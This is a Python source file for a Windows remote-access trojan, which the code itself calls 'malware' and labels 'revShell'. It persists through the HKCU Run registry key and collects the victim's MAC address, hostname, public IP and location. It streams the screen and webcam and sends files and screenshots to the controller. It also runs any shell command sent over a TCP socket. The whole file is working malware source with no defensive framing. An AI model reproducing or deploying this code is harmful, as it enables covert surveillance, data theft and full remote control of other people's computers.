
import mss
import os
import socket
import subprocess
import uuid
import urllib.request
import platform
import json
import winreg
# from tqdm import tqdm
from vidstream import ScreenShareClient
from vidstream import CameraClient
from vidstream import VideoClient
import threading

class Persistence:
    def __init__(self):
        self.check_reg()

    def add_reg(self):
        addr = r'E:\Programming_language\Python\Socket_programming\Reverse_Tcp\server_tcp.exe'
        reg_hkey = winreg.HKEY_CURRENT_USER
        key = winreg.OpenKey(
            reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        try:
            winreg.SetValueEx(key, 'revShell_server', 0, winreg.REG_SZ, addr)
            # print("\n\t\t Sucessfully persintace make ")
        except:
            pass
        winreg.CloseKey(key)

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(
                reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'revShell_server' not in v:
                    index += 1
                    continue
                return True
        except:
            winreg.CloseKey(key)
            self.add_reg()


class CommonData():
    def __init__(self):
        pass

    @property
    def mac(self):
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            msg = f"Mac  ---> {mac}"
            return msg
        except:
            return "null"

    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname())
            msg = f"Hostname ---> {hostname}"
            return msg

        except:
            return "null"

    @property
    def public_ip(self):
        try:
            ip = urllib.request.urlopen(
                "https://api.ipify.org/").read().decode("utf-8")
            msg = f"Ip ---> {ip}"
            return msg
        except:
            return "null"

    @property
    def location(self):
        try:
            url = "http://ipinfo.io/json"
            response = urllib.request.urlopen(url)
            data = json.load(response)
            country = data['country']
            city = data['city']
            msg = f"  Country ----> {country} || City ----> {city}"
            return msg
        except:
            return 'null'

    @property
    def machine(self):
        try:
            msg = f"Machine ---> {platform.system()}"
            return msg
            # return platform.system()

        except:
            return "null"

    @property
    def core(self):
        try:
            msg = f"Core ---> {platform.machine()}"
            return msg
        except:
            return "null"

    @property
    def info(self):
        try:
            info = f"{self.mac} \n{self.hostname} \n{self.public_ip} \nLocation ---->  {self.location} \n{self.machine} \n{self.core}"
            return info
        except:
            return "null"

class Attack():
    def __init__(self):
        pass

    def screenshare(self):
        try:
            client=ScreenShareClient( (socket.gethostbyname(socket.gethostname() ) ),9999 )
            client.start_stream()
        except:
            pass

    def webcam(self):
        try:
            client=CameraClient( (socket.gethostbyname(socket.gethostname() ) ),9999 )
            client.start_stream()
            
        except:
            pass

    def videoshare(self,fielname):
        client=VideoClient( (socket.gethostbyname(socket.gethostname() )), 9999, fielname)
        client.start_stream()

class reverse_tcp:
    host_ip = socket.gethostbyname(socket.gethostname())
    port = 12345
    Bytes_size = 4096
    Encoder = "utf-8"

    def __init__(self):
        p=Persistence()
        # Crate a socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host_ip, self.port))
        self.server_socket.listen()
        print(f"[+] Listening on {self.host_ip}:{self.port}")
        self.socket_init()

    def socket_init(self):
        # Aceept the connection
        self.client_socket, self.client_addr = self.server_socket.accept()
        print(f"\n\t\t Server is Connected on {self.client_addr[0]} : {self.client_addr[1]}")

        self.main()

    def send_msg(self, msg):
        msg = bytes(f"{msg}\n\n -:> ", "utf-8")
        self.client_socket.sendall(msg)

    def receive_msg(self):
        received = self.client_socket.recv(self.Bytes_size)
        return received.decode(self.Encoder)

    def upload_File(self, filename):
        try:
            filesize = os.path.getsize(filename)
            data = f"{filename}|{filesize}"   
            self.client_socket.send(data.encode(self.Encoder))
            # print("Sending file information") 

            msg = self.client_socket.recv(self.Bytes_size).decode(self.Encoder)
            # print(f"SERVER: {msg}")    
            # print(f"filename ----> {filename}")

            # bar = tqdm(range(filesize), f"Uploading ......", unit="B",unit_scale=True)
            
            #Sending to remote client             
            if self.client_socket.send("Ready to recieved --->".encode(self.Encoder)) !=None:
                with open(filename,"rb") as file:
                    while True:
                        data=file.read(self.Bytes_size)

                        if not data:
                            print("Eof")
                            self.client_socket.send("[revShell] Sucessfully Transfer from server side".encode(self.Encoder))
                            break
                            
                        self.client_socket.send(data) 
                        # bar.update(len(data))
                        print("\n\t\t Sending file ")
                        self.client_socket.recv(self.Bytes_size) #wait for recived 
                file.close()
         
            self.send_msg("[revShell] Sucessfully Taken Screenshot ")
            # self.main("[revShell] Sucessfully  done upload  ".encode(self.Encoder))

        except:
            pass

    def screenshot_taken(self):
        try:        
            output_filename = 'take_screenshot.png'
            with mss.mss() as mss_instance:
                mss_instance.shot(output=output_filename)
                print("\n\t\t Sucessully screenshot Taken ")
            
            #Sending to remote client             
            if self.client_socket.send("Ready to recieved --->".encode(self.Encoder)) !=None:
                with open(output_filename,"rb") as file:
                    while True:
                        data=file.read(self.Bytes_size)
                        if not data:
                            self.client_socket.send("Done |".encode(self.Encoder))
                            break
                            
                        self.client_socket.send(data) 
                        self.client_socket.recv(self.Bytes_size) #wait for recived 

                file.close()


            os.remove("screenshot.png")           
            self.send_msg("[revShell] Sucessfully Taken Screenshot ")
            # self.main("[revShell] Sucessfully Taken Screenshot ".encode(self.Encoder))

        except:
            pass

    def main(self, intial="[revShell] You have connected --> " ):
        if self.send_msg(intial) != None:
            print("\n\t\t Error Occured ")

        # main of the server
        while True:
            try:
                msg = self.receive_msg()
                self.hq(msg)
            except:
                self.client_socket.close()
                self.socket_init()

    def hq(self, msg):
        try:
            if msg[:5] == 'data.':
                data = CommonData()

                if msg[:10] == "data.mac":
                    self.send_msg(data.mac)

                elif msg[:13] == "data.hostname":
                    self.send_msg(data.hostname)
                elif msg[:7] == "data.ip":
                    self.send_msg(data.public_ip)

                elif msg[:13] == "data.location":
                    self.send_msg(data.location)
                elif msg[:12] == "data.machine":
                    self.send_msg(data.machine)
                elif msg[:9] == "data.core":
                    self.send_msg(data.core)
                elif msg[:9] == "data.info":
                    self.send_msg(data.info)
            
            elif msg[:6] =="attack":
                attack=Attack()

                if msg[:13] == "attack.webcam":
                    t1=threading.Thread(target=attack.webcam)
                    self.client_socket.send("cameraclient".encode(self.Encoder))
                    t1.start()
                    # self.client_socket.send("[revShell] start webcame ".encode(self.Encoder))
                    self.main("[revShell] start webcame ")

                elif msg[:13] == "attack.screen":
                    self.client_socket.send("screenshare".encode(self.Encoder))
                    t=threading.Thread(target=attack.screenshare)
                    t.start()
                    # self.client_socket.send("[revShell] start capture screen ".encode(self.Encoder))
                    self.main("[revShell] start capture screen ")

                elif msg[:17] == "attack.videoshare":
                    filename_data=msg[18:]
                    self.client_socket.send("videoshare".encode(self.Encoder))
                    t2=threading.Thread(target=attack.videoshare, args=(filename_data,) )
                    # self.client_socket.send("[revShell] start sharing video ".encode(self.Encoder))
                    t2.start()
                    self.main("[revShell] start sharing video ")
                
            else:

                # Normal command in a shell
                tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()

                # Result from subprcess shell stdout decoded in utf-8
                myresult = stdout.decode("utf-8")
                # self.send_msg(myresult)

                if msg[:2] == 'cd':
                    os.chdir(msg[3:])
                    self.send_msg('[revshell] *changed dir*')

                elif msg[:4] == 'exit':
                    # close the client socket
                    self.send_msg('[revshell] *Exiting *')
                    self.client_socket.close()
                    # goto socket_init() method and listen for connection
                    self.socket_init()

                elif msg[:8] == "download":
                    if self.send_msg("Downloader") == None:
                        filename = msg[9:]
                        filename = filename.strip()
                        self.upload_File(filename)
                        self.send_msg("[revShell] Sucessfully Download  file ")
                
                #screenshot
                elif msg[:10]=="screenshot":
                    if self.send_msg("screenshot") == None:
                        self.screenshot_taken()

                else:
                    # Send result to the client
                    self.send_msg(myresult)
        except Exception as e:
            # print(e) #Debugging
            self.send_msg(f'[revShell] {e}')


if __name__ == "__main__":
    malware = reverse_tcp()
